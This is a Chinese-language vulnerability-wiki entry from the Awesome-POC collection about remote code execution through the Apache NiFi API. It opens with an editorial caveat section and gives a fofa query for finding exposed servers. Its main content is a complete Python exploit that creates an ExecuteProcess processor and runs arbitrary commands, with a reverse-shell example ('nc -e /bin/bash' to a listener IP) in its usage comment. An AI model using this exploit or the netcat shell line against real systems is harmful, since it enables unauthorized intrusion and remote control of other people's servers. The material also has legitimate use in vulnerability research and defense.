---
source: "Threekiii/Awesome-POC"
title: "Apache NiFi Api 远程代码执行 RCE"
product: "Apache NiFi流程管理API"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
prerequisites: "API匿名可写或已有流程修改/受限组件执行权限，ExecuteProcess可用"
source_status: "unknown"
side_effects: "含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。"
id: "vw-d43b005b58c1ad7a34d14c3c"
entity_id: "ve-d43b005b58c1ad7a34d14c3c"
schema_version: "1"
---

# Apache NiFi Api 远程代码执行 RCE

<!-- vulwiki-editorial:start -->
## 校订与适用边界

- 适用前提：API匿名可写或已有流程修改/受限组件执行权限，ExecuteProcess可用
- 证据范围：代码调用正常管理功能创建并运行处理器，不是已标识CVE；check_is_vul定义后根本未被调用

### 尚未解决的证据缺口

以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：

- supportsLogin=false不能独立证明可写权限，且主程序没检查
- clean_up只STOP/threads，不删除处理器；DELETE地址拼成run-status/threads疑错，缺JSON头/修订处理
- 硬编码revision1、cmd按空格split、无timeout/结果检查
- 缺版本/部署条件；fofa title==语法混乱

### 操作风险与资料使用

- 含反向连接或交互式命令执行方法：会产生出站连接和子进程；目标、监听端与网络须在授权隔离范围内，结束后关闭会话并核对遗留进程。

本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
<!-- vulwiki-editorial:end -->

## 技术正文与历史材料

## 漏洞描述

Apache NiFi是Apache Software Foundation的一个软件项目，旨在使软件系统之间的数据流自动化。

参考链接：

- https://twitter.com/chybeta/status/1333341820596568065
- https://github.com/imjdl/Apache-NiFi-Api-RCE
- https://forum.ywhack.com/thread-114763-1-3.html

## 网络测绘

```
"nifi" && title=="NiFi"
```

## 漏洞复现

exp：

```python
import sys
import json
import requests as req


class Exp:
    def __init__(self, url):
        self.url = url

    def check_is_vul(self):
        url = self.url + "/nifi-api/access/config"
        try:
            res = req.get(url=url, verify=False)
            data = res.json()
            return not data["config"]["supportsLogin"]
        except Exception as e:
            pass
        return False

    def clean_up(self, p_id):
        url = self.url + "/nifi-api/processors/" + p_id + "/run-status"
        data = {'revision': {'clientId': 'x', 'version': 1}, 'state': 'STOPPED'}
        req.put(url=url, data=json.dumps(data), verify=False)
        req.delete(url + "/threads", verify=False)

    def exploit(self, cmd):
        g_id = self.fetch_process_group()
        if g_id:
            p_id = self.create_process(g_id)
            if p_id:
                self.run_cmd(p_id=p_id, cmd=cmd)
                self.clean_up(p_id=p_id)

    def run_cmd(self, p_id, cmd):
        url = self.url + "/nifi-api/processors/" + p_id
        cmd = cmd.split(" ")
        data = {
            'component': {
                'config': {
                    'autoTerminatedRelationships': ['success'],
                    'properties': {
                        'Command': cmd[0],
                        'Command Arguments': " ".join(cmd[1:]),
                    },
                    'schedulingPeriod': '3600 sec'
                },
                'id': p_id,
                'state': 'RUNNING'
            },
            'revision': {'clientId': 'x', 'version': 1}
        }
        print(data)
        headers = {
            "Content-Type": "application/json",
        }
        res = req.put(url=url, data=json.dumps(data), headers=headers, verify=False)
        return res.json()

    def fetch_process_group(self):
        url = self.url + "/nifi-api/process-groups/root"
        try:
            res = req.get(url=url, verify=False)
            data = res.json()["id"]
            return data
        except Exception as e:
            pass
        return 0

    def create_process(self, process_group_id):
        url = self.url + "/nifi-api/process-groups/" + process_group_id + "/processors"
        data = {
            'component': {
                'type': 'org.apache.nifi.processors.standard.ExecuteProcess'
            },
            'revision': {
                'version': 0
            }
        }
        headers = {
            "Content-Type": "application/json",
        }
        try:
            res = req.post(url=url, data=json.dumps(data), headers=headers, verify=False)
            return res.json()["id"]
        except Exception as e:
            pass
        return 0


if __name__ == '__main__':
    if len(sys.argv) != 3:
        print("rce.py url cmd")
    else:
        url = sys.argv[1]  # http://192.168.1.1:8080
        cmd = sys.argv[2]  # nc -e /bin/bash 192.168.1.129 1234
        e = Exp(url)
        e.exploit(cmd)

```

msf模块：

https://packetstormsecurity.com/files/160260/apache_nifi_processor_rce.rb.txt


---

> 来源：Threekiii/Awesome-POC
